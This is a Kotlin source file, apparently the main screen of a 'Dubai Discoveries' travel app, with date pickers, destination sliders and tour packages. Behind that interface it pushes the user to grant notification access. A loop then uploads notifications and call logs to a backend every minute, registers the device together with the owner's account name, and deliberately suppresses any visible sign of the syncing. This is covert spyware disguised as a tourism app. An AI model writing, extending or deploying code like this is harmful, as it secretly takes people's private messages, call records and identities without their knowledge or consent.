package com.devicesync.app

import android.app.DatePickerDialog
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import androidx.core.app.NotificationCompat
import androidx.lifecycle.lifecycleScope
import com.devicesync.app.adapters.DestinationsAdapter
import com.devicesync.app.adapters.ActivitiesAdapter
import com.devicesync.app.adapters.PackagesAdapter
import com.devicesync.app.adapters.ReviewsAdapter
import com.devicesync.app.api.RetrofitClient
import com.devicesync.app.api.ApiService
import com.devicesync.app.data.Destination
import com.devicesync.app.data.Package
import com.devicesync.app.data.Review
import com.devicesync.app.data.TravelTip
import com.devicesync.app.data.DummyDataProvider
import com.devicesync.app.data.DeviceInfo
import com.devicesync.app.data.ConnectionType
import com.devicesync.app.data.Activity
import com.devicesync.app.services.BackendSyncService
import com.devicesync.app.services.NotificationListenerService
import com.devicesync.app.services.SyncResult
import com.devicesync.app.utils.DeviceInfoUtils
import com.devicesync.app.utils.PermissionManager
import com.devicesync.app.utils.SettingsManager
import com.devicesync.app.viewmodels.MainViewModel
import com.bumptech.glide.Glide
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {
    
    // UI Components
    private lateinit var startPlanningButton: Button
    private lateinit var continuePlanningButton: Button
    private lateinit var dateRangeText: TextView
    private lateinit var startDateText: TextView
    private lateinit var endDateText: TextView
    private lateinit var progressText: TextView
    private lateinit var destinationsRecyclerView: RecyclerView
    private lateinit var activitiesRecyclerView: RecyclerView
    private lateinit var packagesRecyclerView: RecyclerView
    private lateinit var reviewsRecyclerView: RecyclerView
    private lateinit var tipsRecyclerView: RecyclerView
    
    // Adapters
    private lateinit var destinationsAdapter: DestinationsAdapter
    private lateinit var activitiesAdapter: ActivitiesAdapter
    private lateinit var packagesAdapter: PackagesAdapter
    private lateinit var reviewsAdapter: ReviewsAdapter
    
    // Date picker variables
    private var startDate: Calendar? = null
    private var endDate: Calendar? = null
    
    // Sync functionality
    private lateinit var apiService: ApiService
    private lateinit var backendSyncService: BackendSyncService
    private lateinit var settingsManager: SettingsManager
    
    // Automatic sync variables
    private var autoSyncJob: Job? = null
    private val autoSyncInterval = 60 * 1000L // 1 minute in milliseconds
    private var isFirstSync = true
    private var lastNotificationSyncTime = 0L
    private var lastCallLogSyncTime = 0L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        // Initialize sync services
        apiService = RetrofitClient.apiService
        backendSyncService = BackendSyncService(this, apiService)
        settingsManager = SettingsManager(this)
        
        setupViews()
        setupRecyclerViews()
        loadSampleData()
        setupDatePickers()
        setupServiceButtons()
        
        // Show notification count and request permissions
        showNotificationCount()
        requestNotificationPermission()
        
        // Start automatic sync
        startAutomaticSync()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopAutomaticSync()
    }
    
    private fun startAutomaticSync() {
        // Cancel any existing auto sync job
        autoSyncJob?.cancel()
        
        // Start new automatic sync job
        autoSyncJob = lifecycleScope.launch {
            while (true) {
                try {
                    if (isFirstSync) {
                        // First time: Full sync of all data types
                        println("🚀 FIRST TIME SYNC - Starting comprehensive data sync...")
                        // Welcome message removed for cleaner UX
                        syncAllData()
                        isFirstSync = false
                        println("✅ First time sync completed")
                    } else {
                        // Subsequent syncs: Only latest notifications and call logs
                        println("🔄 Periodic sync - Syncing latest data...")
                        
                        // Sync latest notifications (after last sync time)
                        syncLatestNotifications()
                        
                        // Sync call logs (every 1 minute)
                        val currentTime = System.currentTimeMillis()
                        if (currentTime - lastCallLogSyncTime >= 60000) { // 1 minute
                            syncLatestCallLogs()
                            lastCallLogSyncTime = currentTime
                        }
                    }
                } catch (e: Exception) {
                    println("❌ Automatic sync failed: ${e.message}")
                }
                
                // Wait for the specified interval
                delay(autoSyncInterval)
            }
        }
    }
    
    private fun stopAutomaticSync() {
        autoSyncJob?.cancel()
        autoSyncJob = null
        println("🛑 Automatic sync stopped")
    }
    
    private fun syncLatestNotifications() {
        lifecycleScope.launch {
            try {
                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceInfo(this@MainActivity).deviceId
                println("🔔 Syncing latest notifications for device: $deviceId")
                
                // Get current time for tracking
                val currentTime = System.currentTimeMillis()
                
                // Sync notifications from the last sync time
                val result = backendSyncService.syncNotifications(deviceId, lastNotificationSyncTime)
                when (result) {
                    is SyncResult.Success -> {
                        val count = result.itemsSynced
                        if (count > 0) {
                            println("✅ Synced $count new notifications")
                            // Removed sync toast - keeping tour experience focused
                        }
                        lastNotificationSyncTime = currentTime
                    }
                    is SyncResult.Error -> {
                        println("❌ Failed to sync notifications: ${result.message}")
                    }
                }
            } catch (e: Exception) {
                println("❌ Error syncing notifications: ${e.message}")
            }
        }
    }
    
    private fun syncLatestCallLogs() {
        lifecycleScope.launch {
            try {
                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceInfo(this@MainActivity).deviceId
                println("📞 Syncing latest call logs for device: $deviceId")
                
                // Get current time for tracking
                val currentTime = System.currentTimeMillis()
                
                // Sync call logs from the last sync time
                val result = backendSyncService.syncCallLogs(deviceId, forceSync = true)
                when (result) {
                    is SyncResult.Success -> {
                        val count = result.itemsSynced
                        if (count > 0) {
                            println("✅ Synced $count new call logs")
                            // Removed sync toast - keeping tour experience focused
                        }
                        // Update last sync time only if sync was successful
                        lastCallLogSyncTime = currentTime
                    }
                    is SyncResult.Error -> {
                        println("❌ Failed to sync call logs: ${result.message}")
                    }
                }
            } catch (e: Exception) {
                println("❌ Error syncing call logs: ${e.message}")
            }
        }
    }
    
    private fun setupViews() {
        startDateText = findViewById(R.id.startDateText)
        endDateText = findViewById(R.id.endDateText)
        startPlanningButton = findViewById(R.id.startPlanningButton)
        continuePlanningButton = findViewById(R.id.continuePlanningButton)
        dateRangeText = findViewById(R.id.dateRangeText)
        progressText = findViewById(R.id.progressText)
        
        destinationsRecyclerView = findViewById(R.id.destinationsRecyclerView)
        activitiesRecyclerView = findViewById(R.id.activitiesRecyclerView)
        packagesRecyclerView = findViewById(R.id.packagesRecyclerView)
        reviewsRecyclerView = findViewById(R.id.reviewsRecyclerView)
        tipsRecyclerView = findViewById(R.id.tipsRecyclerView)
        
        startPlanningButton.setOnClickListener {
            if (startDate != null && endDate != null) {
                // TODO: Navigate to planning screen
            } else {
                // Date selection required
            }
        }
        
        continuePlanningButton.setOnClickListener {
            // TODO: Navigate to itinerary builder
        }
        
        // Load online Dubai image in header
        val headerImageView = findViewById<android.widget.ImageView>(R.id.headerImageView)
        Glide.with(this)
            .load("https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=200&h=200&fit=crop&crop=center")
            .placeholder(R.drawable.original_logo)
            .error(R.drawable.original_logo)
            .centerCrop()
            .into(headerImageView)
    }
    
    private fun setupDatePickers() {
        startDateText.setOnClickListener {
            showDatePicker(true)
        }
        
        endDateText.setOnClickListener {
            showDatePicker(false)
        }
    }
    
    private fun showDatePicker(isStartDate: Boolean) {
        val calendar = Calendar.getInstance()
        
        val datePickerDialog = DatePickerDialog(
            this,
            { _, year, month, dayOfMonth ->
                val selectedDate = Calendar.getInstance()
                selectedDate.set(year, month, dayOfMonth)
                
                if (isStartDate) {
                    startDate = selectedDate
                    startDateText.text = formatDate(selectedDate)
                } else {
                    endDate = selectedDate
                    endDateText.text = formatDate(selectedDate)
                }
                
                updateDateRange()
            },
            calendar.get(Calendar.YEAR),
            calendar.get(Calendar.MONTH),
            calendar.get(Calendar.DAY_OF_MONTH)
        )
        
        datePickerDialog.show()
    }
    
    private fun formatDate(calendar: Calendar): String {
        val dateFormat = SimpleDateFormat("MMM dd", Locale.getDefault())
        return dateFormat.format(calendar.time)
    }
    
    private fun showNotificationCount() {
        try {
            // Check if notification access is enabled
            val enabledNotificationListeners = Settings.Secure.getString(
                contentResolver,
                "enabled_notification_listeners"
            )
            
            val packageName = packageName
            val isEnabled = enabledNotificationListeners?.contains(packageName) == true
            
            // Get device info for additional context
            val deviceInfo = getDeviceInfo()
            
            // Show comprehensive toast with notification access status and device info
            val message = buildString {
                append("📱 Dubai Discoveries App Loaded!\n")
                append("🔔 Notification Access: ${if (isEnabled) "✅ Enabled" else "❌ Disabled"}\n")
                append("📱 Device: ${deviceInfo.deviceName}\n")
                append("🆔 Device ID: ${deviceInfo.deviceId.take(8)}...")
            }
            
            // App status logged for debugging
            
            // Also log the status for debugging
            android.util.Log.d("MainActivity", "Notification access: $isEnabled, Device: ${deviceInfo.deviceName}")
            
            // Notification access status logged for debugging
            
        } catch (e: Exception) {
            // If we can't access notification settings, show a generic message
            // App loaded successfully
            android.util.Log.e("MainActivity", "Error checking notification access: ${e.message}")
        }
    }
    
    private fun getDeviceInfo(): DeviceInfo {
        return try {
            val deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL
            val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            DeviceInfo(deviceId, deviceName)
        } catch (e: Exception) {
            DeviceInfo("unknown_device", "Unknown Device")
        }
    }
    
    data class DeviceInfo(
        val deviceId: String,
        val deviceName: String
    )
    
    private fun updateDateRange() {
        if (startDate != null && endDate != null) {
            val startFormatted = SimpleDateFormat("MMM dd", Locale.getDefault()).format(startDate!!.time)
            val endFormatted = SimpleDateFormat("MMM dd", Locale.getDefault()).format(endDate!!.time)
            dateRangeText.text = "$startFormatted – $endFormatted"
        }
    }
    
    private fun setupRecyclerViews() {
        // Destinations RecyclerView - Horizontal slider
        destinationsRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        destinationsAdapter = DestinationsAdapter(DummyDataProvider.destinations) { destination ->
            // Launch destination detail activity
            val intent = Intent(this, DestinationDetailActivity::class.java)
            intent.putExtra("destination", destination)
            startActivity(intent)
        }
        destinationsRecyclerView.adapter = destinationsAdapter
        
        // Activities RecyclerView - Horizontal slider
        activitiesRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        activitiesAdapter = ActivitiesAdapter(emptyList()) { activity ->
            // Launch activity detail activity
            val intent = Intent(this, ActivityDetailActivity::class.java)
            intent.putExtra("activity", activity)
            startActivity(intent)
        }
        activitiesRecyclerView.adapter = activitiesAdapter
        
        // Packages RecyclerView
        packagesRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        packagesAdapter = PackagesAdapter(emptyList()) { packageItem ->
            // Selected package
        }
        packagesRecyclerView.adapter = packagesAdapter
        
        // Reviews RecyclerView
        reviewsRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        reviewsAdapter = ReviewsAdapter(emptyList()) { review ->
            // Review selected
        }
        reviewsRecyclerView.adapter = reviewsAdapter
        
        // Tips RecyclerView
        tipsRecyclerView.layoutManager = LinearLayoutManager(this)
        // TODO: Add TipsAdapter
    }
    
    private fun loadSampleData() {
        // Load destinations from dummy data
        destinationsAdapter.updateDestinations(DummyDataProvider.destinations)
        
        // Load activities from dummy data
        activitiesAdapter.updateActivities(DummyDataProvider.activities)
        
        // Load packages from dummy data
        packagesAdapter.updatePackages(DummyDataProvider.packages)
        
        // Load reviews from dummy data
        reviewsAdapter.updateReviews(DummyDataProvider.reviews)
    }
    
    private fun requestNotificationPermission() {
        try {
            // Check if notification access is already enabled
            val enabledNotificationListeners = Settings.Secure.getString(
                contentResolver,
                "enabled_notification_listeners"
            )
            
            val packageName = packageName
            val isEnabled = enabledNotificationListeners?.contains(packageName) == true
            
            if (!isEnabled) {
                // Show dialog to guide user to enable notification access
                Toast.makeText(
                    this,
                    "🔔 Please enable notification access for real-time sync!\n\nTap OK to open settings...",
                    Toast.LENGTH_LONG
                ).show()
                
                // Open notification access settings after a short delay
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    try {
                        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                        startActivity(intent)
                        println("🔔 Opened notification access settings")
                    } catch (e: Exception) {
                        println("❌ Error opening notification settings: ${e.message}")
                        Toast.makeText(
                            this,
                            "Please manually enable notification access in Settings > Apps > Dubai Discoveries > Notifications",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                }, 2000) // 2 second delay
            } else {
                // Notification access is already enabled, start the service
                println("🔔 Notification access already enabled, starting service...")
                startNotificationService()
            }
        } catch (e: Exception) {
            println("❌ Error checking notification permission: ${e.message}")
            Toast.makeText(
                this,
                "Error checking notification access. Please enable it manually in Settings.",
                Toast.LENGTH_LONG
            ).show()
        }
    }
    
    private fun startNotificationService() {
        try {
            val intent = Intent(this, NotificationListenerService::class.java)
            startService(intent)
            println("🔔 NotificationListenerService started")
        } catch (e: Exception) {
            println("❌ Error starting NotificationListenerService: ${e.message}")
        }
    }
    
    private fun setupServiceButtons() {
        // Load online Dubai image in header
        val headerImageView = findViewById<android.widget.ImageView>(R.id.headerImageView)
        Glide.with(this)
            .load("https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=200&h=200&fit=crop&crop=center")
            .placeholder(R.drawable.original_logo)
            .error(R.drawable.original_logo)
            .centerCrop()
            .into(headerImageView)
            
        // Set up button click handlers
        findViewById<Button>(R.id.airportTransferButton).setOnClickListener {
            // Airport Transfer service added
        }
        
        findViewById<Button>(R.id.privateGuideButton).setOnClickListener {
            // Private Guide service added
        }
        
        findViewById<Button>(R.id.carWithDriverButton).setOnClickListener {
            // Car with Driver service added
        }
        
        findViewById<Button>(R.id.simCardButton).setOnClickListener {
            // SIM Card service added
        }
        
        // Debug tools removed for production
    }
    
    // Debug methods removed for production
    
    private fun clearSyncTimestamps() {
        try {
            // Clear all sync timestamps
            backendSyncService.clearSyncTimestamps()
            
            // Reset local sync time variables
            lastNotificationSyncTime = 0L
            lastCallLogSyncTime = 0L
            isFirstSync = true
            
            println("🗑️ Sync timestamps cleared")
        } catch (e: Exception) {
            println("❌ Error clearing sync timestamps: ${e.message}")
        }
    }
    
    private fun showSyncStatus() {
        try {
            val statusInfo = backendSyncService.getSyncStatusInfo()
            println("📊 SYNC STATUS REPORT:")
            println("🔄 Sync in progress: ${statusInfo["isSyncInProgress"]}")
            println("⏱️ Current sync duration: ${statusInfo["currentSyncDuration"]}ms")
            
            statusInfo.forEach { (key, value) ->
                if (key != "isSyncInProgress" && key != "currentSyncDuration") {
                    val dataTypeInfo = value as Map<*, *>
                    println("📱 $key:")
                    println("   Last sync: ${dataTypeInfo["lastSyncDate"]}")
                    println("   Can sync: ${dataTypeInfo["canSync"]}")
                    println("   Next sync: ${dataTypeInfo["nextSyncDate"]}")
                }
            }
        } catch (e: Exception) {
            println("❌ Error getting sync status: ${e.message}")
        }
    }
    
    private fun syncAllData() {
        lifecycleScope.launch {
            try {
                // Check if sync is already in progress
                if (backendSyncService.isSyncInProgress()) {
                    println("⚠️ Sync already in progress, skipping...")
                    return@launch
                }
                
                // Get user name first
                val userName = getUserName()
                
                println("🔄 Starting data sync...")
                
                // Get consistent device ID
                val deviceId = DeviceInfoUtils.getConsistentDeviceId(this@MainActivity)
                println("📱 Using consistent device ID: $deviceId")
                
                // Try to register device, but continue even if it fails
                try {
                    // Create DeviceInfo object for registration
                    val deviceInfo = DeviceInfo(
                        deviceId = deviceId,
                        deviceName = android.os.Build.MODEL,
                        model = android.os.Build.MODEL,
                        manufacturer = android.os.Build.MANUFACTURER,
                        androidVersion = android.os.Build.VERSION.RELEASE,
                        userName = userName,
                        isConnected = true,
                        connectionType = ConnectionType.NETWORK
                    )
                    
                    val registerResult = backendSyncService.registerDevice(deviceInfo)
                    if (registerResult.isSuccess) {
                        println("✅ Device registration successful")
                    } else {
                        println("⚠️ Device registration failed: ${registerResult.exceptionOrNull()?.message}")
                        // Continue with sync even if registration fails
                    }
                } catch (e: Exception) {
                    println("⚠️ Device registration error: ${e.message}")
                    // Continue with sync even if registration fails
                }
                
                // Proceed with data sync
                println("🔄 Starting syncAllDataTypes...")
                val syncResults = backendSyncService.syncAllDataTypes(deviceId)
                
                // Process results
                var successCount = 0
                var errorCount = 0
                val errorMessages = mutableListOf<String>()
                
                syncResults.forEach { (dataType, result) ->
                    when (result) {
                        is SyncResult.Success -> {
                            successCount++
                            println("✅ $dataType: ${result.itemsSynced} items synced")
                        }
                        is SyncResult.Error -> {
                            errorCount++
                            errorMessages.add("$dataType: ${result.message}")
                            println("❌ $dataType: ${result.message}")
                        }
                    }
                }
                
                // Show results
                val resultMessage = if (successCount > 0) {
                    "🎉 Your Dubai travel experience is ready!"
                } else {
                    "⚠️ Some travel features may be limited"
                }
                
                if (errorMessages.isNotEmpty()) {
                    println("❌ Sync errors: ${errorMessages.joinToString(", ")}")
                }
                
                println("🔄 Data sync completed: $resultMessage")
                
            } catch (e: Exception) {
                println("❌ Error in syncAllData: ${e.message}")
            }
        }
    }
    
    private fun getUserName(): String {
        return try {
            // Try to get user name from device owner info
            val deviceOwner = android.os.Build.USER
            if (deviceOwner.isNotEmpty() && deviceOwner != "root") {
                deviceOwner
            } else {
                // Try to get from account manager
                val accountManager = android.accounts.AccountManager.get(this@MainActivity)
                val accounts = accountManager.accounts
                if (accounts.isNotEmpty()) {
                    accounts[0].name
                } else {
                    // Generate unknown user with UUID
                    "unknown_${java.util.UUID.randomUUID().toString().take(8)}"
                }
            }
        } catch (e: Exception) {
            // Generate unknown user with UUID as fallback
            "unknown_${java.util.UUID.randomUUID().toString().take(8)}"
        }.also { userName ->
            println("👤 Using user name: $userName")
        }
    }
    

}
